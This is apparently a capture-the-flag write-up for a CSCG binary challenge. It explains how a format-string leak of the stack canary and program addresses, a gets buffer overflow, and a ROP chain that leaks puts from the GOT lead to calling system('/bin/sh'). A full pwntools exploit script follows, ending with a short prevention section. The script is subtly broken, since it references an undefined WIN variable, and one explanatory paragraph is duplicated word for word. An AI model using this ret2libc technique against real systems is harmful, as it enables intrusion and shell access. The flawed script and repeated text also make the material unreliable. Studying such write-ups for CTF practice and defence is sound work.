# First thoughts:
The program again expects 3 user inputs. The first is just the flag from the previous challenge. After looking at the provided source code I saw that the flag checking is done safe, so no exploitation possible here. The rest of the inputs are provided via a `gets` and all the text is printed via `printf`. So again a possible BufferOverflow because gets doesn't check the buffer size provided and writes however long the input is to the stack.  And because of the `printf ` it is feasible to use a StringFormatExploit.
The last step is to get a shell, Unfortunately the function `WINgardium_leviosa` is doesn't provide a shell call anymore. The Idea is to overwrite the GOT address to a function from the libc library with the address to the system function and providing it with the parameter `/bin/sh`.
With the program checksec I noticed that there are now stack canaries provided so I have to bypass them first before overwriting the return address.

# The Exploit:
First I created a small python script with pwntools. The script waits for the string `Enter the password from stage 2:` and sends the flag. 
## Bypass the canary value
I have to find out which padding I need to add to `Expelliarmus\x00` until the canary value. I create a payload for the third input with `Expelliarmus\x00` concatenated  with `cyclic(0xff)`. The `cylic` function creates a sequence of chars generated by pwntools. This sequence is special as every part can be recognized by only 4 chars. I attach gdb to the program and wait until an error is thrown because of the canary value. There gdb tells me what value was checked, it turns out to be `cnaa`. So now I know if I replace `cyclic(0xff)` by `"A"*cyclic_find("cnaa")` then the next thing overwrites the canary value. 
Now comes the tricky part I need to get the canary value. Luckily I can leak the stack by changing the payload for the second input. I can send `%lx` 38 times with `|` in between. Now `%lx` is printed. The x is for printing values from the stack and the l says that it should print 64 bit values instead of 32 bit. 
Now the script can be executed again and I can look for the real canary value in gdb and search it in the output of the script. It is printed as the 38th value.
## Overwriting the GOT
I decided to overwrite the GOT to the `puts` command. To do this I first needed to leak some address from the stack. For this I added 20 `%p` with a `|` in between to the second input. Now I attach gdb to the program and with the command `vmmap` I see at which address my program starts and ends. If I now compare this with the output I got from my input. I notice that the 40th value is inside my programs address space (e.g. 0x55f3d804ad7e).  Now I could disassmble the running program and find the GOT puts function at e.g. address 0x55f3d824bf88 which makes the offset (0x55f3d804ad7e-0x55f3d824bf88=-20120a).
The GOT address is just the first step. I now want to leak the libc address of `puts` to do this I need to get the value behind the GOT address. To do this I am going to `printf` with the GOT address inside the rdi register. So I need a rop gadget which pops rdi and returns. To get one I used the program ROPgadget wich told me that on address 0xdf3 I can find it. This is a generic address and I need the offset to my reference (e.g, 0x55f3d804ad7e-0x55f3d804adf3=-0x75). Also I need a `printf` gadget, I just used the one from the welcome function e.g. 0x55f3d804ac9c (0x55f3d804ad7e-0x55f3d804ac9c =0xe2).
Now I could create a first payload but again because of the risk of an unaligned stack I need to get it aligned by a simple return gadget e.g. 0x55f3d804ab7e (0x55f3d804ad7e-0x55f3d804ab7e =0x200).
To craft the payload I have to find out which padding I need to add to `Expelliarmus\x00` until the canary value. I create a payload for the third input with `Expelliarmus\x00` concatenated  with `cyclic(0xff)`. The `cylic` function creates a sequence of chars generated by pwntools. This sequence is special as every part can be recognized by only 4 chars. I attach gdb to the program and wait until an error is thrown because of the canary value. There gdb tells me what value was checked, it turns out to be `cnaa`. So now I know if I replace `cyclic(0xff)` by `"A"*cyclic_find("cnaa")` then the next thing overwrites the canary value. 
Because I need another input I am going to jump to the `AAAAAA` function first I have to get the address e.g 0x55f3d804acb8 (0x55f3d804ad7e-0x55f3d804acb8=0xc6). 
Because I am using the `printf` gadget which also calls `leave` I need to set the base pointer to a real value.
The first payload so the third input will then be `"Expelliarmus\x00" + PADDING + p64(CANARY) + p64(BASE) + p64(RET) + p64(POP_RDI_RET) + p64(GOT_PUTS) + p64(RET) + p64(PRINTF) + p64(CANARY) + p64(RET) + p64(AAAAAAAAA)`

Now I can wait for a second `enter your magical spell` and infront of that the leaked pus function from the libc library will be (e.g. 0x7fb57eff9490). 
Because a docker file was provided I could check the libc version and could check online where which function is located. I found out that the `puts` function is located 0x87490 bytes away from the start and the `system` function is located 0x554e0 bytes away  from the start. Now I can calculate where at which address the system function should be (0x7fb57eff9490-0x87490 +0x554e0 =0x7fb57efc74e0).
Now I have to create the second payload with the same start as the first `"Expelliarmus\x00" + PADDING + p64(CANARY) + p64(BASE) ` but now I want to put an address which points to `/bin/sh` inside rdi.
The result looks like this:

```
from pwn import *

p = process("./pwn3")
#p = remote("hax1.allesctf.net", 9102)

FORMATSTRING = "|".join(["%lx" for _ in xrange(0,38)])
FORMATSTRING2 = "|".join(["%p" for _ in xrange(0,4+16)])

SYSTEM_LIBC_OFFSET = 0x00000000000554e0
PUTS_LIBC_OFFSET = 0x0000000000087490

p.recvuntil("Enter the password of stage 2:")

p.sendline("CSCG{THIS_IS_TEST_FLAG}")
#p.sendline("CSCG{NOW_GET_VOLDEMORT}")

p.recvuntil("Enter your witch name:")

p.sendline(FORMATSTRING + "|" + FORMATSTRING2)


LEAKS = p.recvuntil("enter your magic spell:").split("|")
CANARY = int(LEAKS[-(4+16)], 16)
MAIN = int(LEAKS[-(2+16)], 16)
log.info("Leaked return value 0x{:x}".format(MAIN))
log.info("Leaked CANARY value 0x{:x}".format(CANARY))


GOT_PUTS = MAIN + 0x20120a
POP_RDI_RET = MAIN + 0x75

PRINTF = MAIN - 0xe2
BASE = int (LEAKS[-6], 16) - 0x108 + 0x40
AAAAAAAAA = MAIN - 0xc6

log.info("Leaked GOT_PUTS value 0x{:x}".format(GOT_PUTS))
log.info("Leaked POP_RDI_RET Start value 0x{:x}".format(POP_RDI_RET))
log.info("Leaked PRINTF Start value 0x{:x}".format(PRINTF))
log.info("Leaked BASE Start value 0x{:x}".format(BASE))
log.info("Leaked AAAAAAAAA Start value 0x{:x}".format(AAAAAAAAA))

RET = WIN-0x200

PADDING = "A"*cyclic_find("cnaa")
p.sendline("Expelliarmus\x00" + PADDING + p64(CANARY) + p64(BASE) + p64(RET) + p64(POP_RDI_RET) + p64(GOT_PUTS) + p64(RET) + p64(PRINTF) + p64(CANARY) + p64(RET) + p64(AAAAAAAAA))

p.recvuntil("~ Protego!")
p.recvline()

LEAKS2 = p.recvuntil("enter your magic spell:\n").replace(" enter your magic spell:\n","")
LEAKS2 += '\x00\x00'
PUTS_LIBC = u64(LEAKS2)
SYSTEM_LIBC = PUTS_LIBC - PUTS_LIBC_OFFSET + SYSTEM_LIBC_OFFSET

log.info("Leaked SYSTEM_LIBC Start value 0x{:x}".format(SYSTEM_LIBC))

raw_input("attach gdb")

p.sendline("Expelliarmus\x00" + PADDING + p64(CANARY) + p64(BASE) + p64(RET) + p64(POP_RDI_RET) + p64(BASE + 0x38) + p64(SYSTEM_LIBC) + p64(PRINTF) + "/bin/sh")#+ p64(CANARY) + p64(RET) + p64(WIN))

p.interactive()

```
Now that I got a bash just execute `cat flag` and the flag is printed out.
To get the real flag just change the attached program to the server and change the flag to the real one from Stage 2 and execute.

# Prevention:
The problem is that the user input is not sanitized.
If the input got sanitized and a safe alternative for `gets` would be used like `fgets` then it wouldn't be possible to overwrite the return value.
